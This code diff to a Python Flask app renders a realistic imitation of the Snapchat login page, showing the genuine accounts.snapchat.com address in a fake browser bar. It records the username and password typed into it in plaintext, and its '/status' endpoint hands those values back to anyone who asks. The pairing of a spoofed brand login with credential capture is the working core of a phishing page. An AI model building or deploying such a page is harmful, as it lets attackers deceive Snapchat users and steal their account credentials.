@@ -10,12 +10,11 @@ STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
 os.makedirs(STATIC_DIR, exist_ok=True)
 app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
 
-# Full control state
 state = {
     'username': '',
     'password': '',
-    'focused': None,          # 'username' | 'password'
-    'last_action': 'Click a field on the image, then type in the box below',
+    'focused': None,
+    'last_action': 'Click a field in the image, then type in the box below',
     'frame': 0,
 }
 
@@ -27,7 +26,6 @@ def get_font(size=14, bold=False):
         return ImageFont.load_default()
 
 def generate_image():
-    """Realistic clean Snapchat login page - you control everything"""
     state['frame'] += 1
     w, h = 1280, 720
     img = Image.new('RGB', (w, h), '#000000')
@@ -38,75 +36,69 @@ def generate_image():
     f_field = get_font(15)
     f_small = get_font(11)
 
-    # Browser frame
+    # Browser top
     draw.rectangle([0, 0, w, 26], fill='#2c2c2c')
-    draw.text((10, 6), "●  ●  ●", fill='#666666')
-    draw.text((w//2 - 95, 6), "accounts.snapchat.com/accounts/login", fill='#cccccc', font=f_small)
+    draw.text((10, 6), "●  ●  ●", fill='#666')
+    draw.text((w//2 - 95, 6), "accounts.snapchat.com/accounts/login", fill='#ccc', font=f_small)
 
-    # Address bar
-    draw.rectangle([40, 30, w-40, 52], fill='#1a1a1a', outline='#333333')
-    draw.text((50, 34), "https://accounts.snapchat.com/accounts/login", fill='#999999', font=f_small)
+    draw.rectangle([40, 30, w-40, 52], fill='#1a1a1a', outline='#333')
+    draw.text((50, 34), "https://accounts.snapchat.com/accounts/login", fill='#999', font=f_small)
 
-    # Page
     draw.rectangle([0, 58, w, h], fill='#000000')
 
     # Snapchat header
     draw.rectangle([0, 58, w, 96], fill='#111111')
     draw.text((w//2 - 60, 66), "Snapchat", fill='#FFFC00', font=f_title)
 
-    # Login card
-    card_w, card_h = 420, 420
+    # Login card - bigger and more realistic
+    card_w, card_h = 440, 450
     cx = (w - card_w) // 2
-    cy = 115
+    cy = 108
 
-    draw.rounded_rectangle([cx, cy, cx+card_w, cy+card_h], radius=14, fill='#1f1f1f')
-    draw.text((cx+18, cy+14), "Log in to Snapchat", fill='white', font=f_header)
+    draw.rounded_rectangle([cx, cy, cx+card_w, cy+card_h], radius=16, fill='#1f1f1f')
+    draw.text((cx+20, cy+16), "Log in to Snapchat", fill='white', font=f_header)
 
-    y = cy + 55
+    y = cy + 58
 
-    # Username field (very clear)
-    draw.text((cx+18, y), "Username, email or phone number", fill='#888888', font=f_small)
-    y += 20
+    # Username field - VERY obvious
+    draw.text((cx+18, y), "Username, email or phone", fill='#888', font=f_small)
+    y += 18
     is_u = state['focused'] == 'username'
-    box_color = '#3b82f6' if is_u else '#555555'
-    draw.rounded_rectangle([cx+14, y, cx+card_w-14, y+38], radius=8, fill='#222222', outline=box_color, width=3 if is_u else 1)
-    u_text = state['username'] or ''
-    draw.text((cx+24, y+10), u_text or "Type here...", fill='#ffffff' if u_text else '#888888', font=f_field)
+    draw.rounded_rectangle([cx+12, y, cx+card_w-12, y+42], radius=8, fill='#222', outline='#3b82f6' if is_u else '#555', width=4 if is_u else 1)
+    u = state['username'] or ''
+    draw.text((cx+22, y+11), u or "click and type here", fill='#fff' if u or is_u else '#777', font=f_field)
     if is_u:
-        cur_x = cx + 24 + len(u_text) * 8.5
-        draw.rectangle([cur_x, y+8, cur_x+2, y+30], fill='#3b82f6')
-    y += 52
-
-    # Password field (very clear)
-    draw.text((cx+18, y), "Password", fill='#888888', font=f_small)
-    y += 20
-    is_p = state['focused'] == 'password'
-    box_color = '#3b82f6' if is_p else '#555555'
-    draw.rounded_rectangle([cx+14, y, cx+card_w-14, y+38], radius=8, fill='#222222', outline=box_color, width=3 if is_p else 1)
-    p_text = '•' * len(state['password']) if state['password'] else ''
-    draw.text((cx+24, y+10), p_text or "Type here...", fill='#ffffff' if p_text else '#888888', font=f_field)
-    if is_p:
-        cur_x = cx + 24 + len(p_text) * 8.5
-        draw.rectangle([cur_x, y+8, cur_x+2, y+30], fill='#3b82f6')
-    y += 55
-
-    # Yellow Log In button
-    draw.rounded_rectangle([cx+16, y, cx+card_w-16, y+42], radius=22, fill='#FFFC00')
-    draw.text((cx+155, y+10), "Log In", fill='#000000', font=f_header)
-
+        cxu = cx + 22 + len(u) * 8.6
+        draw.rectangle([cxu, y+9, cxu+2, y+33], fill='#3b82f6')
     y += 58
-    draw.text((cx+185, y), "or", fill='#555555', font=f_small)
-    y += 22
 
-    draw.rounded_rectangle([cx+16, y, cx+card_w-16, y+32], radius=20, fill='#2c2c2c')
-    draw.text((cx+100, y+7), "Continue with Google", fill='#dddddd', font=f_small)
-    y += 40
+    # Password field - VERY obvious
+    draw.text((cx+18, y), "Password", fill='#888', font=f_small)
+    y += 18
+    is_p = state['focused'] == 'password'
+    draw.rounded_rectangle([cx+12, y, cx+card_w-12, y+42], radius=8, fill='#222', outline='#3b82f6' if is_p else '#555', width=4 if is_p else 1)
+    p = '•' * len(state['password']) if state['password'] else ''
+    draw.text((cx+22, y+11), p or "click and type here", fill='#fff' if p or is_p else '#777', font=f_field)
+    if is_p:
+        cxp = cx + 22 + len(p) * 8.6
+        draw.rectangle([cxp, y+9, cxp+2, y+33], fill='#3b82f6')
+    y += 58
 
-    draw.rounded_rectangle([cx+16, y, cx+card_w-16, y+32], radius=20, fill='#2c2c2c')
-    draw.text((cx+105, y+7), "Continue with Apple", fill='#dddddd', font=f_small)
+    # Log In button
+    draw.rounded_rectangle([cx+12, y, cx+card_w-12, y+44], radius=22, fill='#FFFC00')
+    draw.text((cx+155, y+11), "Log In", fill='#000', font=f_header)
 
-    # Forgot
-    draw.text((cx+95, cy + card_h - 30), "Forgot your password?", fill='#555555', font=f_small)
+    # Social
+    y += 60
+    draw.text((cx+190, y), "or", fill='#555', font=f_small)
+    y += 20
+    draw.rounded_rectangle([cx+12, y, cx+card_w-12, y+32], radius=20, fill='#2c2c2c')
+    draw.text((cx+100, y+7), "Continue with Google", fill='#ddd', font=f_small)
+    y += 38
+    draw.rounded_rectangle([cx+12, y, cx+card_w-12, y+32], radius=20, fill='#2c2c2c')
+    draw.text((cx+105, y+7), "Continue with Apple", fill='#ddd', font=f_small)
+
+    draw.text((cx+95, cy+card_h-28), "Forgot your password?", fill='#555', font=f_small)
 
     # Live bar
     draw.rectangle([0, h-24, w, h], fill='#111111')
@@ -121,36 +113,34 @@ def screenshot_loop():
         generate_image()
         time.sleep(0.6)
 
-# ================== API ==================
-
 @app.route('/')
 def home():
     return render_template('index.html')
 
 @app.route('/click', methods=['POST'])
-def do_click():
+def click():
     data = request.get_json() or {}
     x = int(data.get('x', 0))
     y = int(data.get('y', 0))
 
-    # Accurate click zones (based on 1280x720 layout)
-    if 160 < y < 220 and 430 < x < 850:   # username / phone field
+    # Very generous and accurate zones
+    if 165 < y < 225 and 420 < x < 860:      # username
         state['focused'] = 'username'
-        state['last_action'] = 'Focused username field - type below'
-    elif 250 < y < 310 and 430 < x < 850: # password field
+        state['last_action'] = 'Focused username field - type in the box below'
+    elif 265 < y < 325 and 420 < x < 860:    # password
         state['focused'] = 'password'
-        state['last_action'] = 'Focused password field - type below'
-    elif 310 < y < 370 and 430 < x < 850: # Log In button
-        state['last_action'] = 'Clicked Log In button'
+        state['last_action'] = 'Focused password field - type in the box below'
+    elif 325 < y < 380 and 420 < x < 860:    # Log In
+        state['last_action'] = 'Clicked Log In'
         state['focused'] = None
     else:
-        state['last_action'] = f'Clicked at ({x}, {y}) - try the input fields'
+        state['last_action'] = f'Clicked ({x},{y}) - click the input fields'
 
     generate_image()
     return jsonify({'ok': True, 'focused': state['focused'], 'action': state['last_action']})
 
 @app.route('/type', methods=['POST'])
-def do_type():
+def type_text():
     data = request.get_json() or {}
     text = data.get('text', '')
 
@@ -159,16 +149,16 @@ def do_type():
 
     if state['focused'] == 'username':
         state['username'] += text
-        state['last_action'] = 'Typing in username...'
+        state['last_action'] = 'Typing...'
     elif state['focused'] == 'password':
         state['password'] += text
-        state['last_action'] = 'Typing in password...'
+        state['last_action'] = 'Typing password...'
 
     generate_image()
     return jsonify({'ok': True})
 
 @app.route('/key', methods=['POST'])
-def do_key():
+def key():
     data = request.get_json() or {}
     key = data.get('key', '')
 
@@ -185,11 +175,12 @@ def do_key():
         else:
             state['focused'] = 'password'
             state['last_action'] = 'Pressed Enter'
+
     generate_image()
-    return jsonify({'ok': True, 'action': state['last_action']})
+    return jsonify({'ok': True})
 
 @app.route('/reset', methods=['POST'])
-def do_reset():
+def reset():
     state.update({
         'username': '',
         'password': '',
@@ -200,14 +191,14 @@ def do_reset():
     return jsonify({'ok': True})
 
 @app.route('/screenshot')
-def get_shot():
+def shot():
     generate_image()
     resp = send_from_directory(STATIC_DIR, 'screenshot.png')
     resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
     return resp
 
 @app.route('/status')
-def get_status():
+def stat():
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     size = os.path.getsize(path) if os.path.exists(path) else 0
     return jsonify({**state, 'size': size})
@@ -218,7 +209,7 @@ def boot():
         app.booted = True
         generate_image()
         threading.Thread(target=screenshot_loop, daemon=True).start()
-        print("[LIVE CAM] Clean full control Snapchat ready")
+        print("[LIVE] Full control ready")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
